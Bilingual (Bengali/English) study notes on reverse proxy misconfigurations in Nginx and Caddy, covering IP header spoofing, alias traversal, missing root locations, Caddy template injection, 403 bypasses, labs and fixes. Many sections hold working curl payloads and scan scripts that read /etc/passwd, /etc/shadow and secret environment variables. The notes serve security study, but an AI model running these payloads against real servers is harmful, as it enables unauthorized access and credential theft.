# 🔄 Reverse Proxy Misconfigurations — Detailed Study Notes

> **Primary Targets:** Nginx, Caddy, HAProxy, Apache
> **Audience:** Cybersecurity students, ethical hackers, bug bounty hunters
> **Disclaimer:** শুধুমাত্র authorized system এবং lab environment এ practice করো।

---

## 📚 Table of Contents

1. [Concept — Reverse Proxy কী?](#1-concept--reverse-proxy-কী)
2. [HTTP Header Spoofing](#2-http-header-spoofing)
   - [X-Forwarded-For Abuse](#21-x-forwarded-for-abuse)
   - [X-Real-IP Abuse](#22-x-real-ip-abuse)
   - [True-Client-IP Abuse](#23-true-client-ip-abuse)
3. [Nginx Misconfigurations](#3-nginx-misconfigurations)
   - [Off-By-Slash (Alias Traversal)](#31-off-by-slash-alias-traversal)
   - [Missing Root Location](#32-missing-root-location)
   - [Other Common Nginx Bugs](#33-other-common-nginx-bugs)
4. [Caddy Template Injection](#4-caddy-template-injection)
5. [403 Bypass Techniques](#5-403-bypass-techniques)
6. [Practical Lab Setup](#6-practical-lab-setup)
7. [Testing Methodology](#7-testing-methodology)
8. [Defense Cheat Sheet](#8-defense-cheat-sheet)
9. [References](#9-references)

---

## 1. Concept — Reverse Proxy কী?

### Forward Proxy vs Reverse Proxy

```
Forward Proxy (Client-side):
  Client → [Forward Proxy] → Internet
  Client এর identity hide করে (VPN এর মতো)

Reverse Proxy (Server-side):
  Client → [Reverse Proxy] → Backend Servers
  Server এর infrastructure hide করে
```

```
Reverse Proxy Architecture:
┌──────────────────────────────────────────────────────────────────┐
│                                                                  │
│  Internet                                                        │
│    │                                                             │
│    ▼                                                             │
│  [Nginx / Caddy / HAProxy]  ← Reverse Proxy                     │
│    │           │           │                                     │
│    ▼           ▼           ▼                                     │
│  [App1]     [App2]      [App3]  ← Backend servers               │
│  :8001      :8002       :8003                                    │
│                                                                  │
│  Reverse Proxy এর কাজ:                                          │
│    ✅ Load balancing                                             │
│    ✅ SSL termination                                            │
│    ✅ Caching                                                    │
│    ✅ Access control                                             │
│    ✅ Rate limiting                                              │
│    ✅ Hide backend structure                                     │
└──────────────────────────────────────────────────────────────────┘
```

### Misconfiguration কী কী হতে পারে?

```
Common Reverse Proxy Misconfigurations:
  ❌ Client-provided headers trust করা (IP spoofing)
  ❌ Nginx alias path mismatch (directory traversal)
  ❌ Missing location block (config leak)
  ❌ Template engine trusted input এ (SSTI/RCE)
  ❌ SSRF via proxy_pass
  ❌ HTTP Request Smuggling
  ❌ WebSocket upgrade bypass
```

---

## 2. HTTP Header Spoofing

### Background — কেন এই headers আছে?

```
Real Scenario:
  Client IP: 1.2.3.4

  Client → Load Balancer (10.0.0.1) → App Server

  App Server দেখে: request এসেছে 10.0.0.1 থেকে (load balancer এর IP)
  → Client এর real IP জানে না!

  Solution: Load Balancer এই header add করে:
  X-Forwarded-For: 1.2.3.4  ← client এর real IP

  App Server এখন X-Forwarded-For দেখে client IP জানতে পারে।
```

### 2.1 X-Forwarded-For Abuse

```
Header format:
  X-Forwarded-For: client_ip, proxy1_ip, proxy2_ip

  Multiple proxies → comma-separated chain!
  X-Forwarded-For: 2.21.213.225, 104.16.148.244, 184.25.37.3
  ↑ এখানে 2.21.213.225 হলো original client IP
```

```
Attack Scenario:
  App: "Rate limit করো IP address দিয়ে"
  App reads: req.headers['x-forwarded-for'].split(',')[0]
  ← প্রথম IP কে client IP হিসেবে trust করে!

  Attacker:
  X-Forwarded-For: 127.0.0.1  ← fake করো!

  App thinks: request এসেছে localhost থেকে!
  → Rate limit bypass!
  → IP-based geo restriction bypass!
  → Admin panel "local only" access bypass!
```

```bash
# IP Restriction Bypass:
# App: "admin panel শুধু localhost থেকে accessible"

# Normal request (blocked):
curl https://target.com/admin
# Response: 403 Forbidden

# Attack — spoof IP:
curl https://target.com/admin \
  -H "X-Forwarded-For: 127.0.0.1"
# Response: 200 OK! (যদি server trust করে)

# Cloudflare behind থাকলে:
curl https://target.com/admin \
  -H "CF-Connecting-IP: 127.0.0.1"

# Multiple IP headers try করো:
curl https://target.com/admin \
  -H "X-Forwarded-For: 127.0.0.1" \
  -H "X-Real-IP: 127.0.0.1" \
  -H "X-Originating-IP: 127.0.0.1" \
  -H "X-Remote-IP: 127.0.0.1" \
  -H "X-Client-IP: 127.0.0.1" \
  -H "True-Client-IP: 127.0.0.1"
```

```
Nginx correct configuration:
  ✅ proxy_set_header X-Forwarded-For $remote_addr;
  → Client এর actual TCP IP ব্যবহার করে
  → Header টা override করে → spoofing prevent!

  ❌ proxy_set_header X-Forwarded-For $http_x_forwarded_for;
  → Client এর header টাই forward করে → spoofable!
```

### 2.2 X-Real-IP Abuse

```
X-Real-IP: single IP (chain নয়)
  → First proxy add করে
  → Single value = simpler but same vulnerability

Attack:
  curl https://target.com/api/sensitive \
    -H "X-Real-IP: 10.0.0.1"
  → Internal IP spoof করে internal-only endpoint access!
```

### 2.3 True-Client-IP Abuse

```
True-Client-IP: Akamai CDN এর header
  → Akamai customer এর real IP forward করে

Attack (যদি app trusted করে):
  curl https://target.com/admin \
    -H "True-Client-IP: 127.0.0.1"
```

### IP Header Testing Script

```bash
#!/bin/bash
# test_ip_headers.sh — সব IP headers test করো

TARGET_URL="https://TARGET.com/admin"
SPOOF_IP="127.0.0.1"
INTERNAL_IPS=("127.0.0.1" "10.0.0.1" "192.168.1.1" "172.16.0.1" "::1")

IP_HEADERS=(
  "X-Forwarded-For"
  "X-Real-IP"
  "X-Originating-IP"
  "X-Remote-IP"
  "X-Remote-Addr"
  "X-Client-IP"
  "True-Client-IP"
  "CF-Connecting-IP"
  "Fastly-Client-IP"
  "X-Cluster-Client-IP"
  "X-Forwarded"
  "Forwarded-For"
  "Forwarded"
)

echo "[*] Testing IP header spoofing against: $TARGET_URL"
echo ""

for header in "${IP_HEADERS[@]}"; do
  for ip in "${INTERNAL_IPS[@]}"; do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
      -H "$header: $ip" \
      "$TARGET_URL")

    if [ "$STATUS" != "403" ] && [ "$STATUS" != "401" ]; then
      echo "[!] POTENTIAL BYPASS: -H \"$header: $ip\" → HTTP $STATUS"
    fi
  done
done

echo "[*] Done!"
```

---

## 3. Nginx Misconfigurations

### 3.1 Off-By-Slash (Alias Traversal)

#### Concept — Nginx Location Matching

```nginx
# Nginx তে location matching rules:

location /app/ {
  # Trailing slash আছে
  # Matches: /app/, /app/foo, /app/bar/baz
  # Does NOT match: /application
}

location /app {
  # Trailing slash নেই
  # Matches: /app, /application, /appzzz, /app/foo (এটাও!)
}
```

#### The Bug — alias directive

```nginx
# ❌ VULNERABLE Configuration:
server {
  location /styles {          # ← trailing slash নেই!
    alias /path/css/;         # ← trailing slash আছে!
  }
}

# Mismatch:
#   location = /styles   (no slash)
#   alias    = /path/css/ (with slash)
```

```
Attack — Path Traversal:

Normal request:
  GET /styles/main.css
  → Nginx maps to: /path/css/main.css ✅

Attack request:
  GET /styles../secret.txt
  → Nginx processes as: /path/css/../secret.txt
  → Normalized to: /path/secret.txt ← directory traversal!

Why?
  /styles matches the location prefix
  ../secret.txt = remaining part
  alias replacement: /path/css/ + ../secret.txt = /path/css/../secret.txt = /path/secret.txt
```

```bash
# Test করো:
curl https://target.com/styles../secret.txt
curl https://target.com/styles../nginx.conf
curl https://target.com/styles../../../etc/passwd
curl https://target.com/styles..%2fsecret.txt    # URL encoded
```

#### Real Vulnerable vs Safe Config

```nginx
# ❌ VULNERABLE:
location /styles {         # no trailing slash
    alias /path/css/;      # has trailing slash
}
# Attack: /styles../file → /path/css/../file → /path/file

# ✅ SAFE (Option 1) — both have trailing slash:
location /styles/ {        # has trailing slash
    alias /path/css/;      # has trailing slash
}

# ✅ SAFE (Option 2) — use root instead of alias:
location /styles/ {
    root /path;            # serves from /path/styles/
}
```

#### More Alias Traversal Examples

```nginx
# Configuration:
location /static {
    alias /var/www/static/;
}
```

```bash
# Attack payloads:
curl https://target.com/static../
curl https://target.com/static../../../etc/passwd
curl https://target.com/static../conf/nginx.conf
curl https://target.com/static..%2f..%2fetc%2fpasswd

# Kyubi tool দিয়ে automated scan:
git clone https://github.com/shiblisec/Kyubi
python3 kyubi.py -u https://target.com
```

### 3.2 Missing Root Location

#### Concept

```nginx
# ❌ VULNERABLE Configuration:
server {
    root /etc/nginx;    # ← Global root set করা আছে!

    location /hello.txt {
        try_files $uri $uri/ =404;
        proxy_pass http://127.0.0.1:8080/;
    }
    # root / location নেই!
}
```

```
Problem:
  Global root = /etc/nginx
  Location block শুধু /hello.txt এর জন্য defined

  যদি কেউ অন্য URL request করে:

  GET /nginx.conf
  → No matching location block
  → Falls back to global root!
  → Serves: /etc/nginx/nginx.conf

  GET /passwd
  → Serves: /etc/nginx/passwd (যদি থাকে)

  Worst case:
  GET /../../../etc/passwd
  → /etc/nginx/../../../etc/passwd → /etc/passwd!
```

```bash
# Attack payloads:
curl https://target.com/nginx.conf      # Nginx config leak!
curl https://target.com/sites-enabled/  # Virtual host configs
curl https://target.com/conf.d/         # Additional configs

# Sensitive files that might exist:
# /etc/nginx/nginx.conf
# /etc/nginx/sites-enabled/default
# /etc/nginx/conf.d/*.conf
# These may contain:
#   - Internal server IPs
#   - Backend service ports
#   - SSL cert locations
#   - Secret keys
#   - Database connection strings
```

#### Safe Configuration

```nginx
# ✅ SAFE:
server {
    root /var/www/html;    # Safe web root

    location / {
        # Explicit root location
        try_files $uri $uri/ =404;
    }

    location /api/ {
        proxy_pass http://127.0.0.1:8080/;
    }

    # /etc/nginx কে root হিসেবে set করো না!
}
```

### 3.3 Other Common Nginx Bugs

#### 3.3.1 proxy_pass with URI vs without

```nginx
# Difference:
location /api/ {
    proxy_pass http://backend/;     # URI আছে (trailing slash)
    # /api/foo → backend/foo (strips /api/)
}

location /api/ {
    proxy_pass http://backend;      # URI নেই (no trailing slash)
    # /api/foo → backend/api/foo (keeps /api/)
}
```

```nginx
# ❌ VULNERABLE — SSRF possibility:
location /proxy/ {
    proxy_pass http://backend$request_uri;
    # $request_uri তে user input থাকতে পারে!
    # Attack: /proxy/../../internal-service/admin
}
```

#### 3.3.2 Nginx SSRF via Internal Routing

```nginx
# ❌ VULNERABLE:
location ~ ^/fetch\?url=(.+)$ {
    proxy_pass $1;    # User-controlled proxy_pass!
    # Attack: /fetch?url=http://169.254.169.254/metadata (AWS metadata!)
    # Attack: /fetch?url=http://internal-service:8080/admin
}
```

#### 3.3.3 add_header Inheritance Bug

```nginx
# ❌ VULNERABLE:
server {
    add_header X-Frame-Options DENY;    # Parent block

    location /special/ {
        add_header X-Custom "value";    # Child block
        # Problem: child block এ add_header থাকলে
        # parent এর X-Frame-Options OVERRIDE হয়!
        # Result: /special/ তে Clickjacking protection নেই!
    }
}

# ✅ SAFE:
location /special/ {
    add_header X-Frame-Options DENY;  # Repeat করো
    add_header X-Custom "value";
}
```

---

## 4. Caddy Template Injection

### Concept

```
Caddy = Modern web server + reverse proxy (Go দিয়ে লেখা)
Templates directive = Go template engine
```

```caddy
# ❌ VULNERABLE Caddy Configuration:
:80 {
    root * /
    templates           ← Template processing enable!
    respond "You came from {http.request.header.Referer}"
    #                    ↑ User-controlled header!
}
```

```
Attack:
  Referer header এ Go template inject করো!

  Caddy processes the response string as Go template:
  "You came from {http.request.header.Referer}"

  Normal: Referer: https://google.com
  Output: "You came from https://google.com"

  Attack: Referer: {{readFile "etc/passwd"}}
  Caddy processes: {{readFile "etc/passwd"}}
  Output: "You came from root:x:0:0:root:/root:/bin/sh..."
  → File read! LFI!
```

### Attack Payloads

```bash
# File read:
curl -H 'Referer: {{readFile "etc/passwd"}}' http://localhost/
curl -H 'Referer: {{readFile "/etc/shadow"}}' http://localhost/
curl -H 'Referer: {{readFile "/etc/nginx/nginx.conf"}}' http://localhost/

# Directory listing:
curl -H 'Referer: {{listFiles "/"}}' http://localhost/
curl -H 'Referer: {{listFiles "/home"}}' http://localhost/
curl -H 'Referer: {{listFiles "/var/www"}}' http://localhost/

# Environment variables:
curl -H 'Referer: {{env "HOME"}}' http://localhost/
curl -H 'Referer: {{env "PATH"}}' http://localhost/
curl -H 'Referer: {{env "DATABASE_URL"}}' http://localhost/
curl -H 'Referer: {{env "SECRET_KEY"}}' http://localhost/
curl -H 'Referer: {{env "AWS_ACCESS_KEY_ID"}}' http://localhost/
curl -H 'Referer: {{env "AWS_SECRET_ACCESS_KEY"}}' http://localhost/
```

| Payload                       | কী করে               |
| ----------------------------- | -------------------- |
| `{{readFile "etc/passwd"}}`   | File read করে        |
| `{{readFile "/etc/shadow"}}`  | Password hashes      |
| `{{listFiles "/"}}`           | Directory listing    |
| `{{env "SECRET_KEY"}}`        | Environment variable |
| `{{env "DATABASE_URL"}}`      | DB credentials       |
| `{{env "AWS_ACCESS_KEY_ID"}}` | AWS keys!            |

### Expected Response

```
HTTP/1.1 200 OK
Content-Type: text/plain

You came from root:x:0:0:root:/root:/bin/sh
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
...
```

### Other Caddy Template Functions

```go
// Caddy Go template আরো functions support করে:
{{.Req.Host}}            // Request host
{{.Req.URL.Path}}        // Request path
{{.Req.Header}}          // All headers
{{now | date "2006-01-02"}}  // Current date
{{httpInclude "/internal-path"}}  // Internal request (SSRF-like!)
```

---

## 5. 403 Bypass Techniques

Reverse proxy access control bypass করার common techniques:

### 5.1 Path Manipulation

```bash
TARGET="https://target.com/admin"

# Direct (403):
curl $TARGET

# Bypass attempts:
curl "$TARGET/"
curl "$TARGET/."
curl "$TARGET///"
curl "$TARGET/./"
curl "$TARGET/%2f"
curl "$TARGET/%2e/"

# Mid-path bypass:
curl "https://target.com/anything/../admin"
curl "https://target.com/anything/..;/admin"
curl "https://target.com/anything/%2e%2e/admin"

# End-path bypass:
curl "$TARGET#"
curl "$TARGET%23"
curl "$TARGET?"
curl "$TARGET%3f"
curl "$TARGET%09"   # Tab
```

### 5.2 HTTP Method Manipulation

```bash
# GET 403:
curl -X GET https://target.com/admin

# Try other methods:
curl -X POST https://target.com/admin
curl -X PUT https://target.com/admin
curl -X PATCH https://target.com/admin
curl -X TRACE https://target.com/admin
curl -X HEAD https://target.com/admin
curl -X OPTIONS https://target.com/admin

# Override method header:
curl -X POST https://target.com/admin \
  -H "X-HTTP-Method-Override: GET" \
  -H "X-Method-Override: GET" \
  -H "X-Original-Method: GET"
```

### 5.3 bypass-url-parser Tool

```bash
# Install:
pip install bypass-url-parser

# Basic usage:
bypass-url-parser -u "http://127.0.0.1/admin/" -s 8.8.8.8 -d

# With cookies:
bypass-url-parser -u "http://target.com/admin/" \
  -H "Cookie: session=YOUR_COOKIE"

# From URL list:
bypass-url-parser -u /path/to/urls.txt -t 30 -T 5

# Test specific bypass methods:
bypass-url-parser -u "http://target.com/admin/" \
  -m "mid_paths, end_paths, headers"

# With request file:
bypass-url-parser -R /path/request_file --request-tls
```

### 5.4 Header-based Bypass

```bash
# Host header manipulation:
curl https://target.com/admin \
  -H "Host: localhost"
curl https://target.com/admin \
  -H "Host: 127.0.0.1"
curl https://target.com/admin \
  -H "Host: internal.target.com"

# Protocol override:
curl https://target.com/admin \
  -H "X-Forwarded-Proto: https"
curl https://target.com/admin \
  -H "X-Forwarded-Scheme: https"
```

---

## 6. Practical Lab Setup

### Lab 1: Nginx Off-By-Slash (Docker)

```bash
mkdir nginx-lab && cd nginx-lab

# Vulnerable Nginx config:
cat > nginx.conf << 'EOF'
events {}

http {
    server {
        listen 80;

        # ❌ Vulnerable: alias mismatch
        location /static {
            alias /var/www/static/;
        }

        # Secret file (outside static dir):
        # /var/www/secret.txt
    }
}
EOF

# Docker দিয়ে চালাও:
docker run -d \
  -p 8080:80 \
  -v $(pwd)/nginx.conf:/etc/nginx/nginx.conf:ro \
  -v $(pwd)/static:/var/www/static \
  --name nginx-test \
  nginx

# Secret file তৈরি করো:
docker exec nginx-test bash -c 'echo "SECRET_FLAG=nginx_pwned" > /var/www/secret.txt'
docker exec nginx-test bash -c 'mkdir -p /var/www/static && echo "css content" > /var/www/static/main.css'

# Normal request:
curl http://localhost:8080/static/main.css
# Response: css content ✅

# Attack — Alias Traversal:
curl http://localhost:8080/static../secret.txt
# Response: SECRET_FLAG=nginx_pwned ← vulnerable!
```

### Lab 2: Caddy Template Injection

```bash
# Install Caddy (Linux):
curl -1sLf 'https://dl.cloudsmith.io/public/caddy/stable/gpg.key' | sudo gpg --dearmor -o /usr/share/keyrings/caddy-stable-archive-keyring.gpg
curl -1sLf 'https://dl.cloudsmith.io/public/caddy/stable/debian.deb.txt' | sudo tee /etc/apt/sources.list.d/caddy-stable.list
sudo apt update && sudo apt install caddy

# Vulnerable Caddyfile:
cat > Caddyfile << 'EOF'
:8081 {
    root * /
    templates
    respond "You came from {http.request.header.Referer}"
}
EOF

# Caddy চালাও:
caddy run --config Caddyfile

# Normal request:
curl -H 'Referer: https://google.com' http://localhost:8081/
# Response: You came from https://google.com

# Attack — Template Injection:
curl -H 'Referer: {{readFile "etc/passwd"}}' http://localhost:8081/
# Response: You came from root:x:0:0:root:/root:/bin/sh...

# Environment variables:
curl -H 'Referer: {{env "HOME"}}' http://localhost:8081/
curl -H 'Referer: {{listFiles "/tmp"}}' http://localhost:8081/
```

### Lab 3: Root Me Challenges

```
✅ Nginx - Alias Misconfiguration
   URL: https://www.root-me.org/en/Challenges/Web-Server/Nginx-Alias-Misconfiguration

✅ Nginx - Root Location Misconfiguration
   URL: https://www.root-me.org/en/Challenges/Web-Server/Nginx-Root-Location-Misconfiguration

✅ Nginx - SSRF Misconfiguration
   URL: https://www.root-me.org/en/Challenges/Web-Server/Nginx-SSRF-Misconfiguration

✅ detectify/vulnerable-nginx (GitHub lab):
   git clone https://github.com/detectify/vulnerable-nginx
   docker-compose up
```

### Lab 4: Gixy — Nginx Config Analyzer

```bash
# Install gixy (static analyzer):
pip install gixy

# Nginx config analyze করো:
gixy /etc/nginx/nginx.conf

# Example output:
# [CRIT] [alias_traversal] /etc/nginx/nginx.conf:
#   Problem: Misconfigured alias
#   Description: With this configuration, an attacker could access:
#     location /static → alias /var/www/static/
#     GET /static../secret.txt → /var/www/static/../secret.txt

# MegaManSec/Gixy-Next (Python3 version):
pip install gixy-next
gixy /etc/nginx/nginx.conf
```

---

## 7. Testing Methodology

### Step 1: Identify Reverse Proxy

```bash
# Response headers দেখো:
curl -I https://target.com

# Nginx:
# Server: nginx/1.24.0

# Caddy:
# Server: Caddy

# Apache:
# Server: Apache/2.4.41

# Cloudflare:
# CF-Ray: ...

# Unknown → try error pages:
curl https://target.com/404-page-that-doesnt-exist
# Nginx এর default error page দেখলে → Nginx confirmed
```

### Step 2: Check IP Header Spoofing

```bash
# Admin/restricted endpoints test করো:
for header in "X-Forwarded-For" "X-Real-IP" "X-Client-IP" "True-Client-IP"; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    -H "$header: 127.0.0.1" \
    https://target.com/admin)
  echo "$header: HTTP $STATUS"
done
```

### Step 3: Nginx Alias Traversal Test

```bash
# Static file locations খোঁজো:
# /static/, /assets/, /public/, /css/, /js/, /images/

# Test করো:
ENDPOINTS=("/static" "/assets" "/public" "/css" "/js" "/img")

for ep in "${ENDPOINTS[@]}"; do
  # Off-by-slash test:
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    "https://target.com${ep}../etc/passwd")

  if [ "$STATUS" = "200" ]; then
    echo "[!] VULNERABLE: ${ep}../etc/passwd returned 200!"
  fi
done

# Kyubi tool:
python3 kyubi.py -u https://target.com
```

### Step 4: Missing Root Location

```bash
# Sensitive Nginx files test করো:
FILES=("nginx.conf" "sites-enabled/default" "conf.d/default.conf" ".htpasswd")

for f in "${FILES[@]}"; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    "https://target.com/$f")

  if [ "$STATUS" = "200" ]; then
    echo "[!] File accessible: /$f (HTTP 200)"
    curl -s "https://target.com/$f" | head -5
  fi
done
```

### Step 5: Caddy Template Injection

```bash
# Template injection test করো various headers এ:
HEADERS=("Referer" "User-Agent" "X-Custom" "Origin" "Host")
PAYLOAD='{{env "HOME"}}'

for header in "${HEADERS[@]}"; do
  RESULT=$(curl -s -H "$header: $PAYLOAD" https://target.com/)
  if echo "$RESULT" | grep -q "/home\|/root"; then
    echo "[!] Template injection via $header header!"
    echo "Response: $RESULT"
  fi
done
```

---

## 8. Defense Cheat Sheet

### Nginx Security

```nginx
# ✅ Fix 1: Alias — trailing slash উভয়ে:
location /static/ {      # has slash
    alias /var/www/static/;  # has slash
}

# ✅ Fix 2: root এর পরিবর্তে alias (often safer):
location /static/ {
    root /var/www;  # serves /var/www/static/
}

# ✅ Fix 3: Explicit root location define করো:
server {
    root /var/www/html;  # safe web root, not /etc/nginx!

    location / {
        try_files $uri $uri/ =404;
    }
}

# ✅ Fix 4: IP header handling:
# Real IP set করো (override client headers):
set_real_ip_from 10.0.0.0/8;        # trusted proxy range
real_ip_header X-Forwarded-For;
real_ip_recursive on;

# অথবা override করে দাও:
proxy_set_header X-Forwarded-For $remote_addr;  # client এর real TCP IP

# ✅ Fix 5: add_header inheritance:
# Security headers সব location এ repeat করো
location /special/ {
    add_header X-Frame-Options DENY always;
    add_header X-Content-Type-Options nosniff always;
    # ... other security headers
}
```

### Caddy Security

```caddy
# ❌ VULNERABLE:
:80 {
    templates
    respond "From: {http.request.header.Referer}"
}

# ✅ SAFE: templates directive সরিয়ে দাও
# অথবা trusted content এ limit করো:
:80 {
    # templates directive use করো না user-controlled input এর সাথে!

    # যদি templates লাগে, static files এ limit করো:
    root * /var/www/html
    templates *.html  # only .html files

    # User header গুলো response এ embed করো না!
}
```

### Defense Summary

```
Attack                          → Fix
────────────────────────────────────────────────────────────────────────
X-Forwarded-For IP spoofing     → real_ip_header config
                                  proxy_set_header X-Forwarded-For $remote_addr
                                  Trust only known proxy IP ranges

Nginx Alias Traversal           → Both location and alias must have trailing /
                                  অথবা root directive use করো alias এর বদলে
                                  Gixy দিয়ে config analyze করো

Missing Root Location           → Explicit / location always define করো
                                  root কে safe path এ set করো (not /etc/nginx)

Caddy Template Injection        → User input কে template context এ embed করো না
                                  templates directive limit করো trusted content এ

403 Bypass via path manip.      → Normalize URL before matching
                                  Consistent path handling enforce করো
```

---

## 9. References

| Resource                   | Link                                                                                                                                    |
| -------------------------- | --------------------------------------------------------------------------------------------------------------------------------------- |
| PayloadsAllTheThings       | [GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Reverse%20Proxy%20Misconfigurations)                           |
| Detectify Nginx Misconfigs | [Detectify Blog](https://blog.detectify.com/industry-insights/common-nginx-misconfigurations-that-leave-your-web-server-ope-to-attack/) |
| Gixy (Nginx Analyzer)      | [GitHub](https://github.com/yandex/gixy)                                                                                                |
| Gixy-Next (Python3)        | [GitHub](https://github.com/MegaManSec/Gixy-Next)                                                                                       |
| Kyubi (Alias Traversal)    | [GitHub](https://github.com/shiblisec/Kyubi)                                                                                            |
| bypass-url-parser          | [GitHub](https://github.com/laluka/bypass-url-parser)                                                                                   |
| Vulnerable Nginx Lab       | [GitHub](https://github.com/detectify/vulnerable-nginx)                                                                                 |
| What is X-Forwarded-For    | [HTTPToolkit Blog](https://httptoolkit.com/blog/what-is-x-forwarded-for/)                                                               |
| Root Me Nginx Labs         | [Root Me](https://www.root-me.org)                                                                                                      |

---

> ✅ **Next Topic Suggestions:**
>
> - `Server Side Request Forgery/README.md` — SSRF (proxy_pass SSRF related)
> - `Web Cache Deception/README.md` — Caching misconfiguration
> - `Request Smuggling/README.md` — HTTP/1 + HTTP/2 desync via proxy
> - `CORS Misconfiguration/README.md` — Cross-origin header abuse

> ⚠️ **Ethical Reminder:** Reverse proxy testing শুধুমাত্র authorized pentest, Bug Bounty scope, বা নিজের lab এ করো।
